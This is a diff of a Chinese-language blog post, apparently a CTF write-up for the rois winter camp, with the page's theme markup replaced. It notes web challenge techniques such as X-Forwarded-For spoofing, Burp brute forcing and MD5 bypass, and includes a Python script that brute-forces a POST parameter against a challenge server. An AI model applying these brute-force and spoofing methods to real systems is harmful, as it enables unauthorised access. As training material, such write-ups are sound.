@@ -1,215 +1,258 @@
-<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>rois-冬令营 | Αιώνιος</title><meta name="keywords" content="ctf"><meta name="author" content="4v1d"><meta name="copyright" content="4v1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="偶然得知了rois举办了这个冬令营 web题目大部分自己做，有几道是在别人帮助下的 很高兴这次密码学做出了两道简单题 今天写下writeup总结一下   web1. 这题确实是签到题，不过刚开始没有想到  打开后是这样的 按照提示输入flag参数  很明显这个javascript弹窗验证了输入flag与校验flag是否一致 所以不知道flag的前提下无法输入正确 放弃一段时间后我想起来可以抓包看">
-<meta property="og:type" content="article">
-<meta property="og:title" content="rois-冬令营">
-<meta property="og:url" content="http://daweitech.github.io/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/index.html">
-<meta property="og:site_name" content="Αιώνιος">
-<meta property="og:description" content="偶然得知了rois举办了这个冬令营 web题目大部分自己做，有几道是在别人帮助下的 很高兴这次密码学做出了两道简单题 今天写下writeup总结一下   web1. 这题确实是签到题，不过刚开始没有想到  打开后是这样的 按照提示输入flag参数  很明显这个javascript弹窗验证了输入flag与校验flag是否一致 所以不知道flag的前提下无法输入正确 放弃一段时间后我想起来可以抓包看">
-<meta property="og:locale">
-<meta property="og:image" content="http://daweitech.github.io/imgr/19.jpg">
-<meta property="article:published_time" content="2022-02-05T13:41:57.000Z">
-<meta property="article:modified_time" content="2022-02-07T03:03:55.873Z">
-<meta property="article:author" content="4v1d">
-<meta property="article:tag" content="ctf">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://daweitech.github.io/imgr/19.jpg"><link rel="shortcut icon" href="/imgr/15.jpg"><link rel="canonical" href="http://daweitech.github.io/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="www.baidu.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
-  copy: {
-    success: 'Copy successfully',
-    error: 'Copy error',
-    noSupport: 'The browser does not support'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  date_suffix: {
-    just: 'Just',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
-  source: {
-    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
-    },
-    fancybox: {
-      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
-};
 
-var saveToLocal = {
-  set: function setWithExpiry(key, value, ttl) {
-    const now = new Date()
-    const expiryDay = ttl * 86400000
-    const item = {
-      value: value,
-      expiry: now.getTime() + expiryDay,
-    }
-    localStorage.setItem(key, JSON.stringify(item))
-  },
 
-  get: function getWithExpiry(key) {
-    const itemStr = localStorage.getItem(key)
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>rois-冬令营 - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content=" 偶然得知了rois举办了这个冬令营
+web题目大部分...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
 
-    if (!itemStr) {
-      return undefined
-    }
-    const item = JSON.parse(itemStr)
-    const now = new Date()
+  
+<link rel="stylesheet" href="/css/style.css">
 
-    if (now.getTime() > item.expiry) {
-      localStorage.removeItem(key)
-      return undefined
-    }
-    return item.value
-  }
-}
 
-// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
-const getScript = url => new Promise((resolve, reject) => {
-  const script = document.createElement('script')
-  script.src = url
-  script.async = true
-  script.onerror = reject
-  script.onload = script.onreadystatechange = function() {
-    const loadState = this.readyState
-    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-    script.onload = script.onreadystatechange = null
-    resolve()
-  }
-  document.head.appendChild(script)
-})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2022-02-07 11:03:55'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
 
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(function () {  window.activateDarkMode = function () {
-    document.documentElement.setAttribute('data-theme', 'dark')
-    if (document.querySelector('meta[name="theme-color"]') !== null) {
-      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-    }
-  }
-  window.activateLightMode = function () {
-    document.documentElement.setAttribute('data-theme', 'light')
-   if (document.querySelector('meta[name="theme-color"]') !== null) {
-      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-    }
-  }
-  const autoChangeMode = 'false'
-  const t = saveToLocal.get('theme')
-  if (autoChangeMode === '1') {
-    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
-    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
-    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
-    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
-    if (t === undefined) {
-      if (isLightMode) activateLightMode()
-      else if (isDarkMode) activateDarkMode()
-      else if (isNotSpecified || hasNoSupport) {
-        const now = new Date()
-        const hour = now.getHours()
-        const isNight = hour <= 6 || hour >= 18
-        isNight ? activateDarkMode() : activateLightMode()
-      }
-      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
-        if (saveToLocal.get('theme') === undefined) {
-          e.matches ? activateDarkMode() : activateLightMode()
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
         }
-      })
-    } else if (t === 'light') activateLightMode()
-    else activateDarkMode()
-  } else if (autoChangeMode === '2') {
-    const now = new Date()
-    const hour = now.getHours()
-    const isNight = hour <= 6 || hour >= 18
-    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
-    else if (t === 'light') activateLightMode()
-    else activateDarkMode()
-  } else {
-    if (t === 'dark') activateDarkMode()
-    else if (t === 'light') activateLightMode()
-  }const asideStatus = saveToLocal.get('aside-status')
-if (asideStatus !== undefined) {
-   if (asideStatus === 'hide') {
-     document.documentElement.classList.add('hide-aside')
-   } else {
-     document.documentElement.classList.remove('hide-aside')
-   }
-}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script> <link rel="preconnect" href="https://fonts.gstatic.com"> <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,300&display=swap" rel="stylesheet"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">83</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/imgr/19.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Αιώνιος</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">rois-冬令营</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-02-05T13:41:57.000Z" title="Created 2022-02-05 21:41:57">2022-02-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-07T03:03:55.873Z" title="Updated 2022-02-07 11:03:55">2022-02-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p> 偶然得知了rois举办了这个冬令营</p>
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">rois-冬令营</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">rois-冬令营</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>February 05, 2022</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>7403</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <p> 偶然得知了rois举办了这个冬令营</p>
 <p>web题目大部分自己做，有几道是在别人帮助下的</p>
 <p>很高兴这次密码学做出了两道简单题</p>
 <p>今天写下writeup总结一下</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214412266.png" alt="image-20220205214412266"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214430069.png" alt="image-20220205214430069"></p>
-<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214507437.png" alt="image-20220205214507437"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214412266.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205214412266</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214430069.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205214430069</span></p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214507437.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205214507437</span></p>
 <p>这题确实是签到题，不过刚开始没有想到</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214617858.png" alt="image-20220205214617858"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214617858.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205214617858</span></p>
 <p>打开后是这样的</p>
 <p>按照提示输入flag参数</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214651070.png" alt="image-20220205214651070"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214651070.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205214651070</span></p>
 <p>很明显这个javascript弹窗验证了输入flag与校验flag是否一致</p>
 <p>所以不知道flag的前提下无法输入正确</p>
 <p>放弃一段时间后我想起来可以抓包看看，因为这只是一道签到题不会太难考点</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215003047.png" alt="image-20220205215003047"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215003047.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215003047</span></p>
 <p>这是直接送上源码了</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215104974.png" alt="image-20220205215104974"></p>
-<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215145268.png" alt="image-20220205215145268"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215246704.png" alt="image-20220205215246704"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215308960.png" alt="image-20220205215308960"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215104974.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215104974</span></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215145268.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215145268</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215246704.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215246704</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215308960.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215308960</span></p>
 <p>通过回显猜测到考点</p>
 <p>xff头的使用</p>
 <p>后面我在同学提醒下才知道可以bp爆破，之前一直手动换ip。。</p>
-<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215904689.png" alt="image-20220205215904689"></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215904689.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215904689</span></p>
 <p>这题是靠搜索出来的</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220015271.png" alt="image-20220205220015271"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215948168.png" alt="image-20220205215948168"></p>
-<h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220225482.png" alt="image-20220205220225482"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220015271.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205220015271</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215948168.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205215948168</span></p>
+<h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220225482.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205220225482</span></p>
 <p>抓包修改即可</p>
-<h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220249818.png" alt="image-20220205220249818"></p>
+<h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220249818.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220205220249818</span></p>
 <p>这题稍微麻烦点</p>
 <p>我吸取的教训是bp要用专业版，这样线程才能高，别用什么社区版爆破半天出不来</p>
 <p>爆破设置如图</p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110042677.png" alt="image-20220207110042677"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/notes.md" alt="image-20220207110002361"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110042677.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220207110042677</span></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/notes.md" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220207110002361</span></p>
 <p>自己尝试写的脚本</p>
 <p>当初没有成功，现在可以了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">scentence = <span class="string">&#x27;敏感文件是什么？？常用工具dirsearch  https://github.com/maurosoria/dirsearch/ 下载可能需要科学上网&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    url1 = <span class="string">&#x27;http://101.35.106.33:1580/?level1=hello&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;level1&#x27;</span>:<span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;level2&#x27;</span>: i&#125;</span><br><span class="line">    r = requests.post(url1, data=payload)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> scentence <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">&quot;爆破数字为&#123;&#125;&quot;</span>.format(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;当前数字&#123;&#125;&quot;.format(i))</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(&#x27;no&#x27;)</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110330038.png" alt="image-20220207110330038"></p>
+<p><img   class="lazyload" data-original="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110330038.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220207110330038</span></p>
 <p>然后这题后面无非是post传参、md5绕过、robots协议、dirsearch扫描之类的小知识点</p>
-<h4 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220453175.png" alt="image-20220205220453175"></p>
-<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220509263.png" alt="image-20220205220509263"></p>
